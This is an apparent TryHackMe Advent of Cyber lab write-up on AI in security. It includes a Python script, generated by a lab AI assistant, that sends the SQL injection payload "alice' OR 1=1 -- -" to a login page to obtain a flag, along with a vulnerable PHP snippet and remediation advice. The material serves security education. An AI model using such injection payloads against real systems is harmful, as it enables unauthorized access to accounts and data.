```
▞▀▖▜▘ ▗     ▞▀▖            ▗▐             ▜   ▌    ▞▀▖▜▘   ▐      ▗    ▌  
▙▄▌▐  ▄ ▛▀▖ ▚▄ ▞▀▖▞▀▖▌ ▌▙▀▖▄▜▀ ▌ ▌ ▄▄▖ ▞▀▖▐ ▞▀▌ ▞▀▘▙▄▌▐ ▛▀▖▜▀  ▛▀▖▄ ▞▀▖▌▗▘
▌ ▌▐  ▐ ▌ ▌ ▖ ▌▛▀ ▌ ▖▌ ▌▌  ▐▐ ▖▚▄▌     ▌ ▌▐ ▌ ▌ ▝▀▖▌ ▌▐ ▌ ▌▐ ▖ ▌ ▌▐ ▌ ▖▛▚ 
▘ ▘▀▘ ▀▘▘ ▘ ▝▀ ▝▀▘▝▀ ▝▀▘▘  ▀▘▀ ▗▄▘     ▝▀  ▘▝▀▘ ▀▀ ▘ ▘▀▘▘ ▘ ▀  ▘ ▘▀▘▝▀ ▘ ▘
```
In this THM room, we unleash the power of AI by exploring it's uses within cyber
security. [^1] We explore the features of AI for processing large amounts of data,
behaviour analysis (for defensive security) and generative AI (for offensive security).

Complete the AI showcase by progressing through all of the stages.
-----------------------------------------------------------------------------------------
Upon visiting the target machines' IP address in the web browser, we can complete the
showcase stages on the Van SolveIT AI assistant. In the beginning, we discover how AI can
be used to generate scripts to exploit vulnerabilities, as part of *Red Team* tasks.
After interacting with it, we are rewarded with an adversary script, that exploits a 
SQL injection vulnerability in the "Elf Login" authentication portal. This is being
explained and executed in the walkthrough for the next task below.
After crafting the SQL injection exploit, we see how AI can be used to analyse logs, as
part of *Blue Team* tasks. Again, we just reply yes to the proposed task the Blue/Red
Team Assistant proposes in this chat. In the log entries, we can see our malicious python
request with the username "alice' OR 1=1: -" and the test password. It immediately
detects an SQL injection and logs our attack machines' IP address, time and date, and
accessed information.
Finally, we harness the power of AI to review source code and identify how vulnerabilites
are introduced, as part of *Software Security*. The software assistant shows us the
source code of this Advent of Cyber web application with the PHP vulnerability.
```php
$user = $_POST['username'] ?? '';
$pass = $_POST['password'] ?? '';
```
Since this PHP code stores user and password in variables without any sanitization, an
attacker can inject malicious SQL queries into the database when the inputs are used in
a query. Instead, a developer should use prepared statements or parameterized queries to
prevent direct input injection. Further, sanitizing any input a user can provide before
storing it in variables and using secure coding practices in general are essential.
After completing this showcase, we are rewarded with the flag for this task.

Execute the exploit against the vulnerable web application to get the flag.
-----------------------------------------------------------------------------------------
We can investigate the authentication portal under `http://<TARGET_MACHINE_IP>:5000` and
then have a look at the exploit provided by the chat assistant. Apparently, the username
input is a string, which is vulnerable to injection attacks. For example, a SQL statement
that is built from the input "alice' OR 1=1: -" is crafted to check if the input is the
name 'alice' or true. So, we save the provided exploit from below in a file `script.py`
and run the script with `python3 script.py`.
```python
import requests

# Set up the login credentials
username = "alice' OR 1=1 -- -"
password = "test"

# Set the URL to the vulnerable login page
url = "http://<TARGET_MACHINE_IP>:5000/login.php"

# Set up the payload input
payload = {
    "username": username,
    "password": password
}

# Send a POST request to the login page with our payload
response = requests.post(url, data=payload)

# Print the response content
print("Response Status Code:", response.status_code)
print("\nResponse Headers:")
for header, value in response.headers.items():
    print(f"  {header}: {value}")
print("\nResponse Body:")
print(response.text)
```
In the response of this SQL injection attack, we can see the status code (200), response
headers and body with the flag.

[^1]: https://tryhackme.com/room/AIforcyber-aoc2025-y9wWQ1zRgB
